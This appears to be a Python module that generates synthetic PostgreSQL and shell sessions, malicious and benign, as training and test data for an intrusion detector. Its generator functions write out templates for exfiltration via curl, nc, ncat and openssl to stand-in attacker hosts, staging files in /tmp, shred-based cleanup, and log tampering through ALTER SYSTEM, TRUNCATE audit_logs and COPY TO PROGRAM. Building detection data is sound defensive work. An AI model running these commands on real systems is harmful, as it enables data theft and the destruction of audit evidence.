#!/usr/bin/env python3
"""High-Diversity Synthesis Engine for CASCE Multi-Domain Scenarios.

Provides dynamic, non-repetitive, high-entropy generators for:
1. Dynamic Network Endpoints (public IPs, enterprise internal IPs, legitimate external partner endpoints)
2. Varied Exfiltration & Staging Commands (curl, wget, openssl, nc, ncat, python, gzip, tar, base64)
3. Dynamic SQL Query Variator (projections, conditions, joins, filters, intervals, aliases)
4. Realistic Session Padding (pre/post administrative queries from domain profiles)
5. Semantic Family Assignment (prevents train/test data leakage)
"""

from __future__ import annotations

import random
import string
from typing import Any, Dict, List, Optional, Tuple


# ============================================================================
# 1. Dynamic Network & Endpoint Generation
# ============================================================================

# Diverse public CIDR prefixes representing varied external internet infrastructure
_PUBLIC_PREFIXES = [
    (45, 33), (91, 219), (104, 244), (142, 250), (168, 119),
    (185, 220), (185, 100), (194, 26), (203, 0), (198, 51),
    (178, 62), (89, 208), (77, 247), (151, 101), (199, 232),
    (140, 82), (52, 14), (54, 230), (35, 186), (13, 248)
]

# Legitimate approved external endpoints (e.g., regulatory compliance, clearinghouses, credit bureaus)
_BENIGN_EXTERNAL_DOMAINS = [
    ("api.fin-clearinghouse.org", 443),
    ("compliance-upload.sec-reg.gov", 443),
    ("edi.supplychain-network.net", 8443),
    ("gateway.health-insurance-clearing.com", 443),
    ("partner-exchange.global-logistics.io", 443),
    ("tax-reporting.revenue-direct.org", 8443),
    ("audit-sync.cloud-ledger.com", 443),
    ("b2b-secure.enterprise-hub.net", 443),
]

_ATTACKER_DOMAINS = [
    "drop.cyber-secure.net", "staging.analytics-sync.org", "tunnel.cdn-edge.io",
    "backup-vault.host-cloud.cc", "collector.metrics-agent.info", "sync.api-telemetry.net",
    "relay.proxy-route.biz", "files.transfer-secure.vip", "cache.fast-delivery.me"
]


def get_diverse_external_endpoint(rng: random.Random) -> Tuple[str, int]:
    """Generate a dynamic public IP address and port from diverse worldwide ranges."""
    p1, p2 = rng.choice(_PUBLIC_PREFIXES)
    p3 = rng.randint(1, 254)
    p4 = rng.randint(2, 254)
    ip = f"{p1}.{p2}.{p3}.{p4}"
    port = rng.choice([443, 8443, 8080, 9443, 4444, 1337, 2222, 9000, 3128, 5000])
    return ip, port


def get_diverse_internal_endpoint(rng: random.Random) -> Tuple[str, int]:
    """Generate an enterprise internal endpoint across private subnet spaces."""
    subnet_type = rng.choice(["10", "172", "192"])
    if subnet_type == "10":
        ip = f"10.{rng.randint(0, 10)}.{rng.randint(1, 50)}.{rng.randint(2, 250)}"
    elif subnet_type == "172":
        ip = f"172.{rng.randint(16, 31)}.{rng.randint(0, 20)}.{rng.randint(2, 250)}"
    else:
        ip = f"192.168.{rng.randint(1, 20)}.{rng.randint(2, 250)}"
    port = rng.choice([5432, 8080, 8443, 9200, 9092, 6379, 443])
    return ip, port


def get_benign_external_endpoint(rng: random.Random) -> Tuple[str, int, str]:
    """Return a legitimate external partner/clearinghouse destination for benign cross-layer sessions."""
    domain, port = rng.choice(_BENIGN_EXTERNAL_DOMAINS)
    ip, _ = get_diverse_external_endpoint(rng)
    return ip, port, f"https://{domain}/v1/submit"


# ============================================================================
# 2. Varied Shell & Exfiltration Commands
# ============================================================================

def generate_exfil_command(rng: random.Random, ip: str, port: int) -> str:
    """Generate a diverse exfiltration command with varied toolchains and flags.
    
    Strictly conforms to codegen.py shell scope (no subshells, no semicolons, no backgrounding).
    """
    domain = rng.choice(_ATTACKER_DOMAINS)
    path = rng.choice(["upload", "push", "sink", "data", "stream", "collect", "ingest"])
    url = f"https://{domain}:{port}/{path}"

    patterns = [
        # Pattern 1: curl with binary streaming
        f"curl -s -k -X POST --data-binary @- {url}",
        # Pattern 2: curl multipart form upload
        f"curl -s -k -F file=@- {url}",
        # Pattern 3: curl with custom header
        f"curl -s -k -H Content-Type:application/json -X POST -d @- {url}",
        # Pattern 4: gzip compression piped to curl
        f"gzip -c | curl -s -k -X POST --data-binary @- {url}",
        # Pattern 5: tar archive piped to curl
        f"tar -czf - | curl -s -k -X POST --data-binary @- {url}",
        # Pattern 6: raw socket netcat transmission
        f"nc -w 5 {ip} {port}",
        # Pattern 7: ncat with ssl encryption
        f"ncat --ssl {ip} {port}",
        # Pattern 8: openssl s_client raw tunnel
        f"openssl s_client -quiet -connect {ip}:{port}",
    ]
    return rng.choice(patterns)


def generate_staging_command(rng: random.Random, temp_dir: str = "/tmp") -> Tuple[str, str]:
    """Generate a diverse local staging command and target file."""
    prefix = rng.choice([".tmp_sync", "dump", "export", "cache_buf", ".pg_staging", "report_out"])
    ext = rng.choice(["dat", "csv", "tar.gz", "bck", "tmp"])
    rand_str = ''.join(rng.choices(string.ascii_lowercase + string.digits, k=6))
    filepath = f"{temp_dir}/{prefix}_{rand_str}.{ext}"

    if ext == "tar.gz":
        cmd = f"tar -czf {filepath} -C /tmp -"
    elif ext == "csv":
        cmd = f"cat > {filepath}"
    else:
        cmd = f"gzip -c > {filepath}"

    return cmd, filepath


def generate_cleanup_command(rng: random.Random, target_file: str) -> str:
    """Generate a diverse file removal / anti-forensics cleanup command."""
    techniques = [
        f"rm -f {target_file}",
        f"shred -u -z -n 1 {target_file}",
        f"unlink {target_file}",
        f"cat /dev/null > {target_file}",
    ]
    return rng.choice(techniques)


def generate_log_tampering_commands(rng: random.Random) -> List[Dict[str, Any]]:
    """Generate diverse defense impairment SQL and shell commands."""
    settings = [
        "log_statement = 'none'",
        "log_min_messages = 'panic'",
        "log_connections = 'off'",
        "log_disconnections = 'off'",
    ]
    chosen_setting = rng.choice(settings)
    
    cleanups = [
        "rm -f /var/log/postgresql/postgresql.log",
        "shred -u /var/log/postgresql/postgresql.log",
        "cat /dev/null > /var/log/postgresql/postgresql.log",
        "unlink /var/log/postgresql/postgresql.log",
    ]
    chosen_cleanup = rng.choice(cleanups)

    return [
        {"sql": f"ALTER SYSTEM SET {chosen_setting}"},
        {"sql": "TRUNCATE TABLE audit_logs" if rng.random() > 0.3 else "DELETE FROM audit_logs WHERE timestamp < NOW()"},
        {"step_id": "cleanup", "sql": f"COPY (SELECT 'tamper_complete') TO PROGRAM '{chosen_cleanup}'"}
    ]


# ============================================================================
# 3. Dynamic SQL Query Variator
# ============================================================================

def vary_sql_query(rng: random.Random, base_table: str, columns: List[str], where_clause: Optional[str] = None) -> str:
    """Synthesize structurally varied SQL queries with random projections, aliases, and limits."""
    # Projections: pick a random subset of columns (at least 2)
    k = rng.randint(2, min(len(columns), 5))
    selected_cols = rng.sample(columns, k)

    # Aliasing styles
    use_alias = rng.random() > 0.4
    t_alias = base_table[0] if use_alias else ""
    
    if use_alias:
        proj_str = ", ".join(f"{t_alias}.{col}" for col in selected_cols)
        from_clause = f"{base_table} {t_alias}"
    else:
        proj_str = ", ".join(selected_cols)
        from_clause = base_table

    query = f"SELECT {proj_str} FROM {from_clause}"
    
    if where_clause:
        query += f" WHERE {where_clause}"

    # Stochastic modifiers
    if rng.random() > 0.6:
        query += f" LIMIT {rng.randint(10, 100)}"
    elif rng.random() > 0.8:
        query += f" ORDER BY 1 DESC"

    return query


# ============================================================================
# 4. Realistic Session Padding (Administrative Noise)
# ============================================================================

def get_session_padding(domain_padding_profile: Optional[Dict[str, Any]], role: str, rng: random.Random) -> Tuple[List[Dict[str, Any]], List[Dict[str, Any]]]:
    """Inject realistic pre- and post-queries from domain YAML padding profile."""
    if not domain_padding_profile or role not in domain_padding_profile:
        # Fallback realistic Postgres session handshake queries
        pre = [{"sql": "SELECT 1"}]
        post = []
        return pre, post

    prof = domain_padding_profile[role]
    pre_candidates = prof.get("pre", [{"sql": "SELECT 1"}])
    post_candidates = prof.get("post", [])

    pre = []
    if pre_candidates and rng.random() > 0.2:
        pre.append(rng.choice(pre_candidates))

    post = []
    if post_candidates and rng.random() > 0.4:
        post.append(rng.choice(post_candidates))

    return pre, post


# ============================================================================
# 5. Semantic Family ID Generator
# ============================================================================

def build_semantic_family_id(domain: str, category_name: str, variant_idx: int) -> str:
    """Build a durable semantic family_id based on category and technique variant.
    
    Ensures instances of the same family share the family_id so family-aware
    splitting keeps them strictly in the same split (Train or Val or Test).
    """
    clean_cat = category_name.lower().replace("make_", "").replace("_malicious", "").replace("_benign", "")
    return f"{domain}_{clean_cat}_fam{variant_idx:02d}"
